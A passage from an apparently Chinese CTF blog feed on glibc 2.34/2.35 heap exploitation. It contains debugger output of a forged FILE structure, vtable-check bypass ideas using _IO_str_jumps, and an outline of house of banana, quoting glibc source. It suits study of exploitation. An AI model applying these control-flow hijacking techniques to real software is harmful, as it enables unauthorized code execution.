class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p &amp;amp;_IO_list_all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus **) &lt;span class=&#34;number&#34;&gt;0x7f85fb7ee680&lt;/span&gt; &amp;lt;_IO_list_all&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus **) &lt;span class=&#34;number&#34;&gt;0x7f85fb7ee680&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x563e47a6c370&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p*(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x563e47a6c370&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x451&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x451&lt;/span&gt;&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x7f85fb7ee0e0&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;1120&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\320\340~\373\205\177&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x563e47a6b290&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_base = &lt;span class=&#34;number&#34;&gt;0x563e47a6b290&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_ptr = &lt;span class=&#34;number&#34;&gt;0x7f85fb7ee660&lt;/span&gt; &amp;lt;_nl_global_locale+&lt;span class=&#34;number&#34;&gt;224&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\327\341z\373\205\177&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_write_end = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_buf_end = &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt; &amp;lt;error: Cannot access memory at address &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_base = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_backup_base = &lt;span class=&#34;number&#34;&gt;0x563e47a6c420&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_save_end = &lt;span class=&#34;number&#34;&gt;0x7f85fb627a6d&lt;/span&gt; &amp;lt;setcontext+&lt;span class=&#34;number&#34;&gt;61&lt;/span&gt;&amp;gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;H\213\242\240&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _markers = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _chain = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _fileno = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _old_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _cur_column = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _vtable_offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _shortbuf = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _lock = &lt;span class=&#34;number&#34;&gt;0x563e47a6c000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _offset = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _codecvt = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _wide_data = &lt;span class=&#34;number&#34;&gt;0x563e47a6c3a0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_list = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _freeres_buf = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __pad5 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _mode = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _unused2 = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt; times&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vtable = &lt;span class=&#34;number&#34;&gt;0x7f85fb7ea0e0&lt;/span&gt; &amp;lt;_IO_wfile_jumps+&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来就是如何触发 exit，利用__malloc_assert 报错，这里可以修改 topchunk 的 size 进行报错。这里依旧可以选择进行 largebin attack. 文章最开始有介绍如何进行连续的两次 attack 。&lt;/p&gt;
</content>
        <category term="pwn" />
        <updated>2022-08-01T08:24:13.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/</id>
        <title>高版本glibc堆的几种利用手法</title>
        <link rel="alternate" href="http://example.com/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/"/>
        <content type="html">&lt;h1 id=&#34;glibc-高版本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#glibc-高版本&#34;&gt;#&lt;/a&gt; Glibc 	高版本&lt;/h1&gt;
&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言：&lt;/h2&gt;
&lt;p&gt;​		本文旨在讲述在 glibc 2.34ubuntu 高版本下（2.34-0ubuntu3.2）的一些利用手法是否依旧可以使用。会对某些手法进行概括，并没有对其进行深入透彻的讲述。感兴趣的朋友可以自行学习，最后详细介绍了 house of banana.&lt;/p&gt;
&lt;p&gt;我只是站在了前任师傅的高台上，为大家进行一些总结分析。&lt;/p&gt;
&lt;p&gt;​		前不久打算深入的去了解在 2.34 以及 2.35 这两个较高版本的 glibc 的堆漏洞的利用。&lt;/p&gt;
&lt;h2 id=&#34;234235-如何利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#234235-如何利用&#34;&gt;#&lt;/a&gt; 2.34 (2.35) 如何利用&lt;/h2&gt;
&lt;h3 id=&#34;一些对比&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些对比&#34;&gt;#&lt;/a&gt; 一些对比&lt;/h3&gt;
&lt;p&gt;2.34 与 2.35 其实非常接近，一般情况下，我们利用的手法也都是一致的，除了继承了 2.29 以来 的各种保护机制，2.34 开始最大的特点，就是删除了__free_hook&lt;/p&gt;
&lt;p&gt;__malloc_hook&lt;/p&gt;
&lt;p&gt;__realloc_hook&lt;/p&gt;
&lt;p&gt;__memalign_hook&lt;/p&gt;
&lt;p&gt;__after_morecore_hook&lt;/p&gt;
&lt;p&gt;这几个常用的钩子函数，而我们最常用的 malloc_hook 以及 free_hook 被完全的禁止了（虽然我们依旧可以在程序中找到对应的符号，但是相关的函数不在对其进行调用），我们只能另寻出路。其实在 2.29 以后的版本中，很多手法都已经失效了，我们常用的无外乎就是劫持程序执行流，以及输入输出流。在 2.23 的版本中，我们是可以修改 vtable，但是 2.24 后就禁止修改，以及再到后面的一些版本还会检查我们的 vtable 是否在允许的范围中（所有的 vtable 储存在一个数组中，以__start_libc_IO_vtables 开始，__stop_libc_IO_vtables 结束）。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_IO_vtable_check (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; SHARED&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Honor the compatibility flag.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (*flag) (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;) = atomic_load_relaxed (&amp;amp;IO_accept_foreign_vtables);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;ifdef&lt;/span&gt; PTR_DEMANGLE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  PTR_DEMANGLE (flag);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (flag == &amp;amp;_IO_vtable_check)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* In case this libc copy is in a non-default namespace, we always&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     need to accept foreign vtables because there is always a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     possibility that FILE * objects are passed across the linking&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     boundary.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Dl_info di;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;link_map&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;l&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!rtld_active ()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        || (_dl_addr (_IO_vtable_check, &amp;amp;di, &amp;amp;l, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;amp;&amp;amp; l-&amp;gt;l_ns != LM_ID_BASE))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是，在 2.34 的早期版本又是可以写的（glibc-2.34-0ubuntu1_amd64）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/dreamkecat/blog_img//blog_img/image-20220922125041443.png&#34; alt=&#34;image-20220922125041443&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个时候我们可以尝试攻击 vtable 结构体，达到 getshell 的目的。&lt;/p&gt;
&lt;p&gt;但是在后面的几次更新中，又将修复了这个漏洞，在 (Ubuntu GLIBC 2.34-0ubuntu3.2) 2.34 版本中，就不可以修改（目前已知在 2.340ubuntu3 版本以及之前的版本依旧有可写的权限）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/dreamkecat/blog_img//blog_img/image-20220922124814590.png&#34; alt=&#34;image-20220922124814590&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们可以找到很多关于如何绕过 vtable check 的办法进行劫持 IO 流，其中最主流的还是利用 _IO_str_jumps  和 _IO_wstr_jumps 两个虚表，&lt;/p&gt;
&lt;p&gt;二者利用几乎一样。我们在源码 /libio/strops.c 可以看到相关的 vatable 的内容，以下我以_IO_str_jumps 作主要说明。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_jump_t&lt;/span&gt; _&lt;span class=&#34;title&#34;&gt;IO_str_jumps&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;libio_vtable&lt;/span&gt; =&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT_DUMMY,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(finish, _IO_str_finish),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(overflow, _IO_str_overflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(underflow, _IO_str_underflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(uflow, _IO_default_uflow),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(pbackfail, _IO_str_pbackfail),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(xsputn, _IO_default_xsputn),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(xsgetn, _IO_default_xsgetn),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seekoff, _IO_str_seekoff),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seekpos, _IO_default_seekpos),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(setbuf, _IO_default_setbuf),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(sync, _IO_default_sync),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(doallocate, _IO_default_doallocate),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(read, _IO_default_read),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(write, _IO_default_write),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(seek, _IO_default_seek),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(close, _IO_default_close),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(stat, _IO_default_stat),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(showmanyc, _IO_default_showmanyc),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  JUMP_INIT(imbue, _IO_default_imbue)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里面有两个很有用的函数&lt;/p&gt;
&lt;p&gt;JUMP_INIT(finish, _IO_str_finish),&lt;br&gt;
JUMP_INIT(overflow, _IO_str_overflow),&lt;/p&gt;
&lt;p&gt;相关源码如下&lt;/p&gt;
&lt;h4 id=&#34;_io_str_finish&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#_io_str_finish&#34;&gt;#&lt;/a&gt; _IO_str_finish&lt;/h4&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Glibc 2.34&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_str_finish (FILE *fp, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; dummy)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_IO_buf_base &amp;amp;&amp;amp; !(fp-&amp;gt;_flags &amp;amp; _IO_USER_BUF))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt; (fp-&amp;gt;_IO_buf_base);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fp-&amp;gt;_IO_buf_base = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_default_finish (fp, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里我们值得注意的是_IO_str_finish，在之前版本中，函数中其实是存在任意函数执行的漏洞的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 